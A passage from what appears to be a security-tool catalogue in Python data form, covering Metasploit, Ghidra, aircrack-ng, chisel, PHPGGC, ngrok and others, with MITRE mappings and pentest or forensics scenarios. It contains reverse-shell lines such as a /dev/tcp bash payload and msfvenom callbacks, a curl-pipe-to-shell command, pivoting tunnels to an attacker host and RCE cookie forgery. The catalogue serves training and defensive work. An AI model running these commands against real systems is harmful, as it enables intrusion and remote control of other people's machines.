        "mitre_tactics": ["Execution", "Initial Access", "Privilege Escalation", "Lateral Movement"],
        "mitre_techniques": ["T1203 - Exploitation for Client Execution", "T1059 - Command and Scripting Interpreter"],
        "syntax_examples": [
            {"cmd": "msfconsole -q", "desc": "Launch Metasploit console in quiet mode."},
            {"cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf", "desc": "Generate Linux x64 standalone reverse TCP executable payload."},
            {"cmd": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.2; set LPORT 4444; run", "desc": "Configure multi-handler listener for incoming Meterpreter callbacks."}
        ],
        "scenarios": [
            {
                "title": "Vulnerability Proof-of-Concept & Controlled Exploit Demonstration",
                "incident_type": "Penetration Testing / Red Team",
                "description": "Discovered unpatched vulnerable service (e.g. Apache Struts, Log4Shell, EternalBlue). Demonstrate executive-level business risk via controlled shell execution.",
                "steps": [
                    "Search exploit module in msfconsole: search eternalblue",
                    "Load module: use exploit/windows/smb/ms17_010_eternalblue",
                    "Set RHOSTS 192.168.1.50 and run 'check' command to verify vulnerability without crashing host.",
                    "Execute payload to gain low-privilege or SYSTEM shell."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Metasploit Unleashed (OffSec)", "url": "https://www.offsec.com/metasploit-unleashed/", "type": "course"},
            {"title": "Rapid7 Metasploit Documentation", "url": "https://docs.metasploit.com/", "type": "doc"}
        ]
    },

    # 7. FORENSICS & REVERSE ENGINEERING
    {
        "name": "ghidra",
        "display_name": "Ghidra (NSA Reverse Engineering Suite)",
        "category": "Reverse Engineering",
        "subcategory": "Disassembler & Decompiler",
        "description": "NSA-developed open-source software reverse engineering suite. Includes disassembly, assembly, decompilation, graphing, and scripting for x86, ARM, MIPS, and other architectures.",
        "package_name": "ghidra",
        "binary_names": ["ghidra"],
        "install_command": "sudo apt install ghidra",
        "mitre_tactics": ["Defense Evasion"],
        "mitre_techniques": ["T1027 - Obfuscated Files or Information", "T1140 - Deobfuscate/Decode Files or Information"],
        "syntax_examples": [
            {"cmd": "ghidra &", "desc": "Launch Ghidra GUI and project workspace."},
            {"cmd": "ghidraHeadless /tmp/ghidra_proj my_proj -import malware.exe -postScript Decompile.java", "desc": "Headless batch decompile of binary sample."}
        ],
        "scenarios": [
            {
                "title": "Malware Disassembly & C2 Configuration Extraction",
                "incident_type": "Malware Analysis / Reverse Engineering",
                "description": "SOC isolated an unknown executable dropped during an intrusion. Need to decompile the binary to find hardcoded C2 IP addresses, encryption keys, and persistence mechanisms.",
                "steps": [
                    "Create new project in Ghidra and import suspect binary.",
                    "Run Auto-Analysis with default decompilation plugins.",
                    "Locate main() or WinMain() function in Symbol Tree.",
                    "Inspect Decompiled C code for WSAStartup, socket, connect, and AES/RC4 string decryption routines."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Ghidra Official Website", "url": "https://ghidra-sre.org/", "type": "doc"},
            {"title": "TryHackMe: CC Ghidra", "url": "https://tryhackme.com/room/ccghidra", "type": "lab"}
        ]
    },
    {
        "name": "binwalk",
        "display_name": "Binwalk (Firmware Analysis Tool)",
        "category": "Forensics",
        "subcategory": "Firmware & Binary Carver",
        "description": "Tool for searching a given binary image for embedded files and executable code. Designed specifically for identifying and extracting firmware images and compressed filesystems.",
        "package_name": "binwalk",
        "binary_names": ["binwalk", "binwalk3"],
        "install_command": "sudo apt install binwalk",
        "mitre_tactics": ["Defense Evasion", "Discovery"],
        "mitre_techniques": ["T1027 - Obfuscated Files or Information"],
        "syntax_examples": [
            {"cmd": "binwalk firmware.bin", "desc": "Scan firmware blob for known signatures and embedded filesystems."},
            {"cmd": "binwalk -e -M firmware.bin", "desc": "Automatically extract (-e) and recursively carve (-M) embedded filesystems."},
            {"cmd": "binwalk -E sample.bin", "desc": "Generate entropy graph to detect encrypted or compressed sections."}
        ],
        "scenarios": [
            {
                "title": "IoT Router Firmware Vulnerability Audit",
                "incident_type": "Embedded Device Pentesting",
                "description": "Obtained vendor firmware update .bin file for an enterprise router. Carve filesystem to check for hardcoded root credentials and insecure web CGI scripts.",
                "steps": [
                    "Carve filesystem: binwalk -Me router_firmware.bin",
                    "Navigate to carved SquashFS directory: cd _router_firmware.bin.extracted/squashfs-root/",
                    "Inspect /etc/shadow for default root password hashes.",
                    "Grep for hardcoded API keys or backdoor telnet daemons."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Binwalk GitHub Repo", "url": "https://github.com/ReFirmLabs/binwalk", "type": "doc"}
        ]
    },
    {
        "name": "autopsy",
        "display_name": "Autopsy Digital Forensics",
        "category": "Forensics",
        "subcategory": "Disk Forensics & Evidence Browser",
        "description": "Digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. Analyzes hard drives, memory cards, and disk images for law enforcement and corporate IR.",
        "package_name": "autopsy",
        "binary_names": ["autopsy"],
        "install_command": "sudo apt install autopsy",
        "mitre_tactics": ["Collection"],
        "mitre_techniques": ["T1005 - Data from Local System"],
        "syntax_examples": [
            {"cmd": "autopsy &", "desc": "Launch Autopsy web server / GUI interface on localhost:9999."}
        ],
        "scenarios": [
            {
                "title": "Employee Data Exfiltration & Disk Image Analysis",
                "incident_type": "Insider Threat / Digital Forensics",
                "description": "Departing executive suspected of copying intellectual property to USB drive prior to resignation. Analyze E01/raw disk image of work laptop.",
                "steps": [
                    "Import E01 disk image into Autopsy case.",
                    "Run Ingest Modules: Keyword Search, Recent Activity, USB Device History, Deleted File Carving.",
                    "Review Windows Registry 'USBSTOR' keys to prove specific serial numbers of plugged USB storage devices.",
                    "Extract carved documents and generate forensic audit report."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Autopsy Documentation", "url": "https://www.autopsy.com/support/", "type": "doc"}
        ]
    },
    {
        "name": "yara",
        "display_name": "YARA (Pattern Matching Swiss Knife)",
        "category": "Forensics",
        "subcategory": "Malware Identification & Rule Engine",
        "description": "Aimed at helping malware researchers identify and classify malware samples. Description-based matching language for strings, regex, and binary byte patterns.",
        "package_name": "yara",
        "binary_names": ["yara"],
        "install_command": "sudo apt install yara",
        "mitre_tactics": ["Defense Evasion", "Discovery"],
        "mitre_techniques": ["T1027 - Obfuscated Files or Information"],
        "syntax_examples": [
            {"cmd": "yara rules.yar /var/www/html/ -r", "desc": "Recursively scan web root for webshell signatures using custom YARA rules."},
            {"cmd": "yara -s webshell_rules.yar suspicious_file.php", "desc": "Scan specific file and print matching string offsets."}
        ],
        "scenarios": [
            {
                "title": "Server Web Shell Hunting After Breach",
                "incident_type": "Incident Response / Threat Hunting",
                "description": "Server was breached via CMS vulnerability. Need to scan entire filesystem to find any hidden PHP/ASP webshells (c99, b374k, China Chopper, web admin scripts).",
                "steps": [
                    "Download or compile webshell YARA rules: git clone https://github.com/Neo23x0/signature-base.git",
                    "Scan web server directories: yara -r signature-base/yara/gen_webshells.yar /var/www/",
                    "Isolate matching infected files for forensic preservation."
                ]
            }
        ],
        "learning_refs": [
            {"title": "YARA Official Documentation", "url": "https://yara.readthedocs.io/", "type": "doc"}
        ]
    },

    # 8. WIRELESS SECURITY
    {
        "name": "aircrack-ng",
        "display_name": "Aircrack-ng Suite",
        "category": "Wireless Attacks",
        "subcategory": "802.11 WEP & WPA/WPA2 Cracker",
        "description": "Complete suite of tools to assess WiFi network security. Focuses on monitoring, attacking, testing, and cracking 802.11 WEP, WPA-PSK, and WPA2-PSK keys. Includes airmon-ng, airodump-ng, aireplay-ng, and packetforge-ng.",
        "package_name": "aircrack-ng",
        "binary_names": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng"],
        "install_command": "sudo apt install aircrack-ng",
        "mitre_tactics": ["Initial Access", "Credential Access"],
        "mitre_techniques": ["T1110 - Brute Force"],
        "syntax_examples": [
            {"cmd": "sudo airmon-ng start wlan0", "desc": "Put wireless interface into monitor mode (creates wlan0mon)."},
            {"cmd": "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon", "desc": "Capture 4-way handshake on channel 6 for specific AP."},
            {"cmd": "sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon", "desc": "Send 5 deauthentication packets to disconnect client and force handshake."},
            {"cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", "desc": "Crack captured WPA2 handshake using RockYou dictionary."}
        ],
        "scenarios": [
            {
                "title": "Corporate Guest WiFi Security Audit",
                "incident_type": "Wireless Penetration Test",
                "description": "Assess if corporate office WiFi Pre-Shared Key (PSK) is vulnerable to capture and offline dictionary cracking.",
                "steps": [
                    "Enable monitor mode: sudo airmon-ng start wlan0",
                    "Survey surrounding networks: sudo airodump-ng wlan0mon",
                    "Target client handshake: sudo airodump-ng --bssid <BSSID> -c <CH> -w wifi_cap wlan0mon",
                    "Capture WPA 4-way handshake, then crack with aircrack-ng or hashcat."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Aircrack-ng Documentation", "url": "https://www.aircrack-ng.org/doku.php", "type": "doc"}
        ]
    },

    # 9. THREAT INTELLIGENCE & OSINT
    {
        "name": "theHarvester",
        "display_name": "theHarvester",
        "category": "Information Gathering",
        "subcategory": "OSINT & Email Harvester",
        "description": "Gathers emails, names, subdomains, IPs, and URLs using public sources like Google, Bing, Baidu, DuckDuckGo, LinkedIn, and Shodan.",
        "package_name": "theharvester",
        "binary_names": ["theHarvester", "theharvester"],
        "install_command": "sudo apt install theharvester",
        "mitre_tactics": ["Reconnaissance"],
        "mitre_techniques": ["T1589 - Gather Victim Identity Information", "T1596 - Search Open Technical Databases"],
        "syntax_examples": [
            {"cmd": "theHarvester -d targetcompany.com -b all -l 500 -f osint_report", "desc": "Query all available OSINT engines for target domain emails and subdomains."}
        ],
        "scenarios": [
            {
                "title": "Phishing Simulation Target List Preparation",
                "incident_type": "Social Engineering / Security Awareness",
                "description": "Gather employee emails and naming conventions for an authorized corporate phishing readiness assessment.",
                "steps": [
                    "Run theHarvester across search engines: theHarvester -d company.com -b google,bing,linkedin,duckduckgo",
                    "Filter active employee email addresses.",
                    "Validate formatting: firstname.lastname@company.com"
                ]
            }
        ],
        "learning_refs": [
            {"title": "theHarvester GitHub", "url": "https://github.com/laramies/theHarvester", "type": "doc"}
        ]
    },
    {
        "name": "sherlock",
        "display_name": "Sherlock (Social Media Username Hunter)",
        "category": "Information Gathering",
        "subcategory": "OSINT Identity Profiler",
        "description": "Hunts down social media accounts by username across hundreds of social networks, forums, and developer platforms.",
        "package_name": "sherlock",
        "binary_names": ["sherlock"],
        "install_command": "sudo apt install sherlock",
        "mitre_tactics": ["Reconnaissance"],
        "mitre_techniques": ["T1589 - Gather Victim Identity Information"],
        "syntax_examples": [
            {"cmd": "sherlock targetusername --print-found", "desc": "Search target handle across 400+ online sites and print found profiles."},
            {"cmd": "sherlock user1 user2 --timeout 5 --csv", "desc": "Batch search handles with 5 second timeout and save CSV."}
        ],
        "scenarios": [
            {
                "title": "Threat Actor Handle Tracing & Attribution",
                "incident_type": "Threat Intelligence / Cyber Threat Attribution",
                "description": "Ransom note or hacker forum post cites an alias (e.g. 'ShadowByte99'). Pivot across developer forums (GitHub, GitLab), Reddit, and paste sites.",
                "steps": [
                    "Execute sherlock: sherlock ShadowByte99",
                    "Review discovered profiles for historical code repos, email addresses, or OPSEC mistakes."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Sherlock Project GitHub", "url": "https://github.com/sherlock-project/sherlock", "type": "doc"}
        ]
    },
    {
        "name": "amass",
        "display_name": "OWASP Amass",
        "category": "Information Gathering",
        "subcategory": "Attack Surface Mapping & In-depth DNS",
        "description": "In-depth DNS enumeration, attack surface mapping, and external asset discovery using open source information gathering and active reconnaissance techniques.",
        "package_name": "amass",
        "binary_names": ["amass"],
        "install_command": "sudo apt install amass",
        "mitre_tactics": ["Reconnaissance", "Discovery"],
        "mitre_techniques": ["T1596 - Search Open Technical Databases", "T1595.003 - Wordlist Scanning"],
        "syntax_examples": [
            {"cmd": "amass enum -d target.com -active", "desc": "Active subdomain enumeration with zone transfers, brute force, and certificate searches."},
            {"cmd": "amass intel -whois -d target.com", "desc": "Discover root domains and ASN IP ranges via WHOIS lookups."}
        ],
        "scenarios": [
            {
                "title": "Shadow IT & Forgotten Cloud Asset Discovery",
                "incident_type": "Attack Surface Management",
                "description": "Identify development subdomains (e.g. dev-api.target.com, staging.target.com) that bypass corporate SSO or lack firewalls.",
                "steps": [
                    "Run Amass enum: amass enum -d company.com -passive -o subdomains.txt",
                    "Feed discovered hosts to httpx to detect live HTTP response codes."
                ]
            }
        ],
        "learning_refs": [
            {"title": "OWASP Amass GitHub", "url": "https://github.com/owasp-amass/amass", "type": "doc"}
        ]
    },

    # 10. PRIVILEGE ESCALATION
    {
        "name": "linpeas",
        "display_name": "LinPEAS (Linux Privilege Escalation Awesome Script)",
        "category": "Privilege Escalation",
        "subcategory": "Linux Local Enumeration",
        "description": "Searches for possible paths to escalate privileges on Linux/Unix hosts. Color-coded output flags vulnerabilities (99% probability privilege escalation vectors highlighted in red/yellow).",
        "package_name": "peass",
        "binary_names": ["linpeas", "linpeas.sh"],
        "install_command": "sudo apt install peass",
        "mitre_tactics": ["Privilege Escalation", "Discovery"],
        "mitre_techniques": ["T1068 - Exploitation for Privilege Escalation", "T1082 - System Information Discovery"],
        "syntax_examples": [
            {"cmd": "linpeas", "desc": "Run local privilege escalation scanner and output colorized suggestions."},
            {"cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "Download and run in-memory without touching disk."}
        ],
        "scenarios": [
            {
                "title": "Post-Exploitation Linux Root Escalation",
                "incident_type": "Linux Penetration Testing / CTF",
                "description": "Obtained low-privilege www-data shell on a web server. Need to identify writable SUID binaries, misconfigured sudoers rules, writable cronjobs, or vulnerable kernel versions.",
                "steps": [
                    "Execute linpeas on compromised target.",
                    "Review RED/YELLOW highlighted findings (e.g., sudo /usr/bin/find without password, SUID python binary, CVE-2024 kernel exploit).",
                    "Leverage GTFOBins syntax to gain root shell."
                ]
            }
        ],
        "learning_refs": [
            {"title": "PEASS-ng Official Repo", "url": "https://github.com/peass-ng/PEASS-ng", "type": "doc"},
            {"title": "GTFOBins Unix Binaries Escapes", "url": "https://gtfobins.github.io/", "type": "doc"}
        ]
    },

    # 11. CARGO (RUST) SECURITY TOOLS
    {
        "name": "rustscan",
        "display_name": "RustScan (Modern Port Scanner)",
        "category": "Information Gathering",
        "subcategory": "Ultra-Fast Port Scanner",
        "description": "The modern port scanner written in Rust. Capable of scanning all 65,535 ports in under 3 seconds with adaptive learning, low overhead, and pipes open ports directly into Nmap for automated NSE scripts and banner grabbing.",
        "package_name": "rustscan",
        "install_source": "Cargo (Rust)",
        "binary_names": ["rustscan"],
        "install_command": "cargo install rustscan",
        "mitre_tactics": ["Reconnaissance", "Discovery"],
        "mitre_techniques": ["T1046 - Network Service Discovery", "T1595 - Active Scanning"],
        "syntax_examples": [
            {"cmd": "rustscan -a 192.168.1.100 -- -A -sC", "desc": "Scan target at hyper speed and pipe discovered open ports directly into Nmap for full version and script scanning."},
            {"cmd": "rustscan -a target.com -r 1-65535 --ulimit 5000", "desc": "Scan all 65k ports with elevated ulimit for maximum concurrency."},
            {"cmd": "rustscan -a '192.168.1.0/24' --greppable", "desc": "Sweep CIDR range and output greppable results for automation pipelines."}
        ],
        "scenarios": [
            {
                "title": "Rapid Network Perimeter Scan on Time-Constrained Engagement",
                "incident_type": "External Penetration Testing",
                "description": "Client provides large external CIDR blocks. Standard scanners take hours per host. RustScan rapidly filters dead ports and executes Nmap NSE scripts only against proven listening ports.",
                "steps": [
                    "Execute RustScan sweep: rustscan -a 10.10.10.15 -- -sV -sC -oN rustscan_initial.txt",
                    "Inspect output for non-standard open ports (e.g. 8443, 8888, 5000, 31337).",
                    "Target open daemons with specific vulnerability checks."
                ]
            }
        ],
        "learning_refs": [
            {"title": "RustScan GitHub Repository", "url": "https://github.com/RustScan/RustScan", "type": "doc"},
            {"title": "RustScan Documentation", "url": "https://rustscan.github.io/RustScan/", "type": "doc"},
            {"title": "TryHackMe: RustScan Room", "url": "https://tryhackme.com/room/rustscan", "type": "lab"}
        ]
    },
    {
        "name": "feroxbuster",
        "display_name": "Feroxbuster (Fast Content Discovery)",
        "category": "Web Applications",
        "subcategory": "Recursive Web Fuzzer",
        "description": "Fast, simple, recursive content discovery tool written in Rust. Designed to rapidly brute-force web endpoints, recurse into discovered directories, and auto-tune scanning speed based on server responses.",
        "package_name": "feroxbuster",
        "install_source": "Cargo (Rust)",
        "binary_names": ["feroxbuster"],
        "install_command": "cargo install feroxbuster",
        "mitre_tactics": ["Discovery", "Reconnaissance"],
        "mitre_techniques": ["T1083 - File and Directory Discovery"],
        "syntax_examples": [
            {"cmd": "feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "desc": "Recursive directory scan with SecLists wordlist."},
            {"cmd": "feroxbuster -u https://target.com -x php,html,txt -t 50 -d 3", "desc": "Scan target with file extensions up to recursion depth 3 with 50 threads."}
        ],
        "scenarios": [
            {
                "title": "Deep Recursive Web Directory Brute-Forcing",
                "incident_type": "Web Application Penetration Test",
                "description": "Web app has deeply nested microservice endpoints that standard single-depth fuzzers miss.",
                "steps": [
                    "Run Feroxbuster: feroxbuster -u https://api.corp.local -x json,yaml,env --depth 4",
                    "Review discovered nested API routes and leaked git repository folders."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Feroxbuster GitHub", "url": "https://github.com/epi052/feroxbuster", "type": "doc"}
        ]
    },

    # 12. GO (GOLANG) SECURITY TOOLS
    {
        "name": "httpx",
        "display_name": "HTTPX (Fast HTTP Toolkit)",
        "category": "Information Gathering",
        "subcategory": "Multi-Purpose HTTP Prober",
        "description": "Fast and multi-purpose HTTP toolkit written in Go by ProjectDiscovery. Probes host availability, titles, technologies (Wappalyzer integration), response codes, TLS certificates, and CDN detection across large host lists.",
        "package_name": "httpx",
        "install_source": "Go Binary",
        "binary_names": ["httpx"],
        "install_command": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "mitre_tactics": ["Reconnaissance", "Discovery"],
        "mitre_techniques": ["T1595 - Active Scanning"],
        "syntax_examples": [
            {"cmd": "cat domains.txt | httpx -status-code -title -tech-detect", "desc": "Probe list of subdomains for live HTTP servers, response codes, page titles, and tech stack."},
            {"cmd": "httpx -u https://target.com -path /admin,/.env,/api/v1 -sc", "desc": "Probe specific paths on target host with status code output."},
            {"cmd": "subfinder -d target.com -silent | httpx -silent -mc 200,302", "desc": "Pipeline subfinder results directly into httpx to filter live hosts."}
        ],
        "scenarios": [
            {
                "title": "Subdomain Triage & Live Web Asset Identification",
                "incident_type": "Attack Surface Management / Bug Bounty",
                "description": "Massive list of 5,000 subdomains discovered via passive OSINT. Need to filter which ones have active web servers and identify interesting technologies.",
                "steps": [
                    "Pipe subdomains into httpx: cat all_subdomains.txt | httpx -title -tech-detect -sc -o live_web.txt",
                    "Grep for high-value technologies (e.g. Jenkins, Grafana, Spring Boot, phpMyAdmin)."
                ]
            }
        ],
        "learning_refs": [
            {"title": "HTTPX GitHub & Docs", "url": "https://github.com/projectdiscovery/httpx", "type": "doc"}
        ]
    },
    {
        "name": "aws-enumerator",
        "display_name": "AWS Enumerator",
        "category": "Information Gathering",
        "subcategory": "Cloud Infrastructure Auditor",
        "description": "Golang-based AWS infrastructure reconnaissance and credential audit tool. Automates enumerating EC2, S3, IAM, Lambda, and VPC assets and testing privileges of discovered AWS access keys.",
        "package_name": "aws-enumerator",
        "install_source": "Go Binary",
        "binary_names": ["aws-enumerator"],
        "install_command": "go install github.com/m47h3wr34n/aws-enumerator@latest",
        "mitre_tactics": ["Discovery", "Privilege Escalation"],
        "mitre_techniques": ["T1526 - Cloud Service Discovery", "T1078.004 - Cloud Accounts"],
        "syntax_examples": [
            {"cmd": "aws-enumerator cred", "desc": "Store and validate AWS access credentials into local session configuration."},
            {"cmd": "aws-enumerator --help", "desc": "View all AWS cloud enumeration modules."}
        ],
        "scenarios": [
            {
                "title": "Compromised AWS Access Key Privilege Triage",
                "incident_type": "Cloud Incident Response / Pentest",
                "description": "Discovered AWS_ACCESS_KEY_ID and SECRET in a leaked GitHub repository. Need to verify IAM identity and enumerate accessible S3 buckets and EC2 instances.",
                "steps": [
                    "Authenticate key with aws-enumerator cred",
                    "Enumerate accessible cloud services and privilege boundaries."
                ]
            }
        ],
        "learning_refs": [
            {"title": "AWS Penetration Testing Cheatsheet", "url": "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security", "type": "doc"}
        ]
    },
    {
        "name": "h2csmuggler",
        "display_name": "H2CSmuggler (HTTP/2 Cleartext Smuggler)",
        "category": "Web Applications",
        "subcategory": "Proxy & WAF Bypass",
        "description": "Tool for detecting and exploiting HTTP/2 Cleartext (h2c) smuggling through reverse proxies and load balancers. Enables bypassing access controls and accessing internal admin endpoints by establishing an upgraded HTTP/2 tunnel through intermediate forward/reverse proxies.",
        "package_name": "h2csmuggler",
        "install_source": "Go Binary",
        "binary_names": ["h2csmuggler"],
        "install_command": "go install github.com/BishopFox/h2csmuggler@latest",
        "mitre_tactics": ["Defense Evasion", "Initial Access"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application"],
        "syntax_examples": [
            {"cmd": "h2csmuggler -x http://proxy.corp:8080 -test http://backend.internal/", "desc": "Test edge proxy for h2c smuggling upgrade capability."},
            {"cmd": "h2csmuggler -x http://target.com/ -request GET -url http://localhost/admin", "desc": "Smuggle request through edge proxy to access restricted internal admin page."}
        ],
        "scenarios": [
            {
                "title": "Bypassing Reverse Proxy IP Allow-Lists via HTTP/2 Desync",
                "incident_type": "Web Application Penetration Test",
                "description": "Internal administrative endpoints (/admin) return 403 Forbidden via HAProxy/Nginx. Leverage HTTP/2 Cleartext Upgrade header injection to bypass proxy routing rules.",
                "steps": [
                    "Verify proxy supports Upgrade: h2c header: h2csmuggler -test https://target.com/",
                    "Smuggle GET /admin request through established tunnel."
                ]
            }
        ],
        "learning_refs": [
            {"title": "BishopFox H2CSmuggler Guide", "url": "https://github.com/BishopFox/h2csmuggler", "type": "doc"}
        ]
    },
    {
        "name": "nuclei",
        "display_name": "Nuclei (Template-based Vulnerability Scanner)",
        "category": "Vulnerability Analysis",
        "subcategory": "Fast Web & Protocol Scanner",
        "description": "Fast and customizable vulnerability scanner powered by simple YAML-based templates. Automates checking for zero-days, CVEs, misconfigurations, default credentials, and token exposures across web, network, and cloud services.",
        "package_name": "nuclei",
        "install_source": "Go Binary",
        "binary_names": ["nuclei"],
        "install_command": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        "mitre_tactics": ["Initial Access", "Discovery"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application"],
        "syntax_examples": [
            {"cmd": "nuclei -u https://target.com -t cves/ -severity critical,high", "desc": "Scan target host specifically for critical and high severity CVE templates."},
            {"cmd": "nuclei -list live_hosts.txt -t exposures/tokens/ -rate-limit 150", "desc": "Scan list of hosts for exposed secret keys and tokens with rate limiting."},
            {"cmd": "nuclei -u https://target.com -t vulnerabilities/ -es info", "desc": "Scan vulnerabilities excluding low-priority informational alerts."}
        ],
        "scenarios": [
            {
                "title": "Immediate Zero-Day Exploit Triage across Enterprise Fleet",
                "incident_type": "Vulnerability Assessment / SOC Threat Hunting",
                "description": "New critical RCE (e.g. Log4Shell, Atlassian Confluence, Citrix Bleed) published. Rapidly verify whether any enterprise servers are vulnerable.",
                "steps": [
                    "Update templates: nuclei -ut",
                    "Scan target assets with newly published CVE template: nuclei -l targets.txt -t cves/2024/ -o vuln_results.txt",
                    "Isolate vulnerable systems for immediate patching."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Nuclei Documentation & Templates", "url": "https://docs.projectdiscovery.io/tools/nuclei", "type": "doc"}
        ]
    },
    {
        "name": "chisel",
        "display_name": "Chisel (Fast TCP/UDP Tunnel over HTTP)",
        "category": "Sniffing & Spoofing",
        "subcategory": "Network Tunnel & Reverse Proxy",
        "description": "A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable written in Go that acts as both client and server, enabling seamless pivoting through firewalls and NATs into internal networks.",
        "package_name": "chisel",
        "install_source": "Go Binary",
        "binary_names": ["chisel"],
        "install_command": "go install github.com/jpillora/chisel@latest",
        "mitre_tactics": ["Command and Control", "Defense Evasion"],
        "mitre_techniques": ["T1090.001 - Internal Proxy", "T1572 - Protocol Tunneling"],
        "syntax_examples": [
            {"cmd": "chisel server -p 8080 --reverse", "desc": "Start Chisel reverse tunnel server on attacker machine on port 8080."},
            {"cmd": "chisel client 10.10.14.2:8080 R:socks", "desc": "Connect from compromised host back to attacker and open internal SOCKS5 proxy on attacker port 1080."},
            {"cmd": "chisel client 10.10.14.2:8080 R:3389:192.168.1.50:3389", "desc": "Forward internal RDP port 3389 directly to attacker localhost."}
        ],
        "scenarios": [
            {
                "title": "Internal Network Pivoting via Egress-Filtered Boundary",
                "incident_type": "Red Team / Lateral Movement",
                "description": "Compromised edge DMZ server can only communicate outbound on HTTP port 80/443. Pivot through it to access internal subnet (172.16.0.0/16).",
                "steps": [
                    "On attacker host: chisel server -p 443 --reverse",
                    "On compromised DMZ host: ./chisel client <ATTACKER_IP>:443 R:socks",
                    "Configure proxychains with socks5 127.0.0.1 1080 to route Nmap, Metasploit, or Evil-WinRM into internal network."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Chisel GitHub Guide", "url": "https://github.com/jpillora/chisel", "type": "doc"}
        ]
    },

    # 13. GITHUB REPOSITORIES & CUSTOM EXPLOITS
    {
        "name": "phpggc",
        "display_name": "PHPGGC (PHP Generic Gadget Chains)",
        "category": "Exploitation Tools",
        "subcategory": "PHP Deserialization Payloads",
        "description": "Library of PHP unserialize() payloads along with an automated CLI tool to generate gadget chains for popular PHP frameworks (Laravel, Symfony, Monolog, Guzzle, SwiftMailer, WordPress, Doctrine, CodeIgniter).",
        "package_name": "phpggc",
        "install_source": "GitHub Clone",
        "binary_names": ["phpggc"],
        "install_command": "git clone https://github.com/ambionics/phpggc.git",
        "mitre_tactics": ["Execution", "Initial Access"],
        "mitre_techniques": ["T1203 - Exploitation for Client Execution"],
        "syntax_examples": [
            {"cmd": "phpggc -l", "desc": "List all available gadget chains for PHP frameworks."},
            {"cmd": "phpggc Laravel/RCE1 system 'id' -b", "desc": "Generate base64-encoded Remote Code Execution payload for Laravel using RCE1 chain."},
            {"cmd": "phpggc Monolog/RCE1 exec 'whoami' -f", "desc": "Generate fast serialized payload targeting Monolog logger library."}
        ],
        "scenarios": [
            {
                "title": "PHP Object Injection Exploit Generation",
                "incident_type": "Web Penetration Test / CTF",
                "description": "Auditing a web application that takes user cookies or base64 tokens and calls unserialize(). Need to construct an RCE POP gadget chain.",
                "steps": [
                    "Identify framework and version (e.g. Laravel 8.x).",
                    "Generate payload: phpggc Laravel/RCE5 system 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' -b",
                    "Send generated payload in vulnerable cookie parameter to receive reverse shell."
                ]
            }
        ],
        "learning_refs": [
            {"title": "PHPGGC GitHub Repository", "url": "https://github.com/ambionics/phpggc", "type": "doc"}
        ]
    },
    {
        "name": "laravel-crypto-killer",
        "display_name": "Laravel Crypto Killer",
        "category": "Exploitation Tools",
        "subcategory": "Laravel Session & Cookie Forgery",
        "description": "Exploit tool for auditing and exploiting Laravel applications configured with weak or known APP_KEYs. Automatically decrypts, tampers, and re-encrypts session cookies to achieve remote code execution via PHP deserialization.",
        "package_name": "laravel-crypto-killer",
        "install_source": "GitHub Clone",
        "binary_names": ["laravel_crypto_killer.py"],
        "install_command": "git clone https://github.com/synacktiv/laravel-crypto-killer.git",
        "mitre_tactics": ["Initial Access", "Credential Access"],
        "mitre_techniques": ["T1552 - Unsecured Credentials"],
        "syntax_examples": [
            {"cmd": "python3 laravel_crypto_killer.py -k 'base64:...' -c 'laravel_session=...'", "desc": "Decrypt Laravel session cookie using target APP_KEY."},
            {"cmd": "python3 laravel_crypto_killer.py -k 'base64:...' -p 'system(\"id\");' --forge", "desc": "Forge encrypted cookie carrying serialized gadget chain."}
        ],
        "scenarios": [
            {
                "title": "Exploiting Leaked .env APP_KEY on Laravel Applications",
                "incident_type": "Web Penetration Test",
                "description": "Discovered exposed .env file containing APP_KEY. Leverage key to forge encrypted sessions and achieve RCE.",
                "steps": [
                    "Extract APP_KEY from leaked .env file.",
                    "Forge admin session cookie with laravel-crypto-killer.",
                    "Combine with PHPGGC to trigger deserialization RCE."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Laravel Crypto Killer GitHub", "url": "https://github.com/synacktiv/laravel-crypto-killer", "type": "doc"}
        ]
    },

    # 14. SNAP & PIPX TOOLS
    {
        "name": "ngrok",
        "display_name": "Ngrok (Secure Ingress Tunnel)",
        "category": "Sniffing & Spoofing",
        "subcategory": "Ingress Tunnel & Webhook C2",
        "description": "Reverse proxy and ingress tunnel daemon. Creates a secure public tunnel (HTTPS/TCP) to local development servers, bypassing firewalls and NATs for webhook testing, phishing simulations, and payload staging.",
        "package_name": "ngrok",
        "install_source": "Snap",
        "binary_names": ["ngrok"],
        "install_command": "sudo snap install ngrok",
        "mitre_tactics": ["Command and Control"],
        "mitre_techniques": ["T1572 - Protocol Tunneling"],
        "syntax_examples": [
            {"cmd": "ngrok http 8080", "desc": "Open public HTTPS tunnel forwarding to local port 8080."},
            {"cmd": "ngrok tcp 4444", "desc": "Forward public TCP port to local Metasploit multi-handler listener."}
        ],
        "scenarios": [
            {
                "title": "Staging Remote Payloads & Reverse Shell Ingress without Port Forwarding",
                "incident_type": "Red Team / CTF",
